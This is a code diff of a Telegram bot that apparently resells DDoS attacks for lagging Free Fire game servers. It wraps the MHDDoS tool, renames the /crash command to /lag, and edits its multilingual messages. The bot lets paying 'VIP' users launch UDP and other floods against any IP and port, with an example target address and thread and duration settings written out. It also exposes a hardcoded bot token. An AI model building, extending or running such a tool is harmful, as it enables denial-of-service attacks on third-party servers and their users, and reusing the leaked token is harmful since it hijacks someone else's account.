@@ -7,7 +7,7 @@ import time
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 
 BOT_TOKEN = "7933828288:AAFX_Ab0wAdOUMnTqIaL2CX1bJX2PpQAqFQ"
-ADMIN_ID = 6454123620
+ADMIN_ID = 1
 START_PY_PATH = "/workspaces/MHDDoS/start.py"
 
 bot = telebot.TeleBot(BOT_TOKEN)
@@ -44,7 +44,7 @@ def handle_start(message):
     if result:
         expiration_date = datetime.strptime(result[0], "%Y-%m-%d %H:%M:%S")
         if datetime.now() > expiration_date:
-            vip_status = "❌ *No.*"
+            vip_status = "❌"
         else:
             dias_restantes = (expiration_date - datetime.now()).days
             vip_status = (
@@ -53,10 +53,10 @@ def handle_start(message):
                 f"📅 Ngày Hết Hạng: {expiration_date.strftime('%d/%m/%Y %H:%M:%S')}"
             )
     else:
-        vip_status = "❌ *No.*"
+        vip_status = "❌ *No tienes un plan vip activo.*"
     markup = InlineKeyboardMarkup()
     button = InlineKeyboardButton(
-        text="💻 ADMIN 💻",
+        text="💻 Cường 💻",
         url=f"tg://user?id={ADMIN_ID}"
 
     )
@@ -65,7 +65,7 @@ def handle_start(message):
     bot.reply_to(
         message,
         (
-            "🤖 *BOT LAG [Free Fire]!*"
+            "🤖 * BOT LAG VIP [Free Fire]!*"
             
 
             f"""
@@ -74,12 +74,12 @@ def handle_start(message):
             "📌 *Cách Dùng:*"
             """
 ```
-/crash <TYPE> <IP/HOST:PORT> <THREADS> <MS>```\n"""
+/lag <TYPE> <IP/HOST:PORT> <THREADS> <MS>```\n"""
             "💡 *Ví Dụ:*"
             """
 ```
-/crash UDP 143.92.125.230:10013 10 900```\n"""
-            "💠 Cường VIP 🇻🇳 💠"
+/lag UDP 143.92.125.230:10013 10 900```\n"""
+            "💠 Cường VIP 💠"
         ),
         reply_markup=markup,
         parse_mode="Markdown",
@@ -96,7 +96,7 @@ def handle_addvip(message):
     if len(args) != 3:
         bot.reply_to(
             message,
-            "❌ No. Use: `/vip <ID> <Số Ngày Dùng Vip 10-999>`",
+            "❌ No. Use: `/vip <ID> <QUANTOS DIAS>`",
             parse_mode="Markdown",
         )
         return
@@ -118,7 +118,7 @@ def handle_addvip(message):
     bot.reply_to(message, f"✅ {telegram_id} VIP {days} Số Ngày Dùng Vip.")
 
 
-@bot.message_handler(commands=["crash"])
+@bot.message_handler(commands=["lag"])
 def handle_ping(message):
     telegram_id = message.from_user.id
 
@@ -147,11 +147,11 @@ def handle_ping(message):
         bot.reply_to(
             message,
             (
-                "❌ *No!*\n\n"
+                "❌ *No.*\n\n"
                 "📌 *Cách Dùng:*\n"
-                "`/crash <TYPE> <IP/HOST:PORT> <THREADS> <MS>`\n\n"
+                "`/lag <TYPE> <IP/HOST:PORT> <THREADS> <MS>`\n\n"
                 "💡 *Ví Dụ:*\n"
-                "`/crash UDP 143.92.125.230:10013 10 900`"
+                "`/lag UDP 143.92.125.230:10013 10 900`"
             ),
             parse_mode="Markdown",
         )
@@ -178,7 +178,7 @@ def handle_ping(message):
             f"⚙️ *Loại Tấn Công:* {attack_type}\n"
             f"🧟‍♀️ *Threads:* {threads}\n"
             f"⏳ *Thời Gian (ms):* {duration}\n\n"
-            f"💠 Cường VIP 🇻🇳 💠"
+            f"💠 Cường  VIP 💠"
         ),
         reply_markup=markup,
         parse_mode="Markdown",
@@ -200,7 +200,7 @@ def handle_stop_attack(call):
         process.terminate()
         del active_attacks[telegram_id]
 
-        bot.answer_callback_query(call.id, "✅")
+        bot.answer_callback_query(call.id, "✅.")
         bot.edit_message_text(
             "*[⛔][⛔]*",
             chat_id=call.message.chat.id,
